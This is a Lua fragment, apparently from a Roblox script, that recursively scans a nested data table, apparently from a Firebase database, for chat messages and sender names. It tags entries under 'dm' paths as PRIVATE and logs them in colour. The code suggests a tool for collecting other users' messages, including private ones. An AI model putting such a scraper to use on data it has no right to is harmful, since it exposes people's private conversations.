local function NeuralScan(data, path, parent)
    if type(data) ~= "table" then return end
    
    for key, val in pairs(data) do
        local currentPath = path .. "/" .. tostring(key)
        
        if type(val) == "table" then
            -- Identify potential message packets
            local m = val.m or val.message or val.content or val.text or val.c
            local u = val.n or val.u or val.sender or val.username or val.name or "Ghost"

            -- If keys are missing, look for any text content (Server/DM logic)
            if not m then
                for subK, subV in pairs(val) do
                    if type(subV) == "string" and #subV > 1 and not subV:find("firebase") then
                        if #subV > 12 and tonumber(subV) then -- It's an ID
                        elseif subK == "u" or subK == "n" then u = subV
                        else m = subV end
                    end
                end
            end

            if m and type(m) == "string" then
                local tag = "LIVE"
                if currentPath:lower():find("dm") then tag = "PRIVATE"
                elseif #tostring(parent) > 8 then tag = "SERVER" end

                local id = tostring(u)..tostring(m)..tag
                if not processedIds[id] then
                    processedIds[id] = true
                    local col = (tag == "PRIVATE") and Color3.fromRGB(255, 100, 200) or Color3.fromRGB(255, 255, 255)
                    AddLog(tag, tostring(u), tostring(m), col)
                end
            end
            NeuralScan(val, currentPath, key)
        end
    end
end

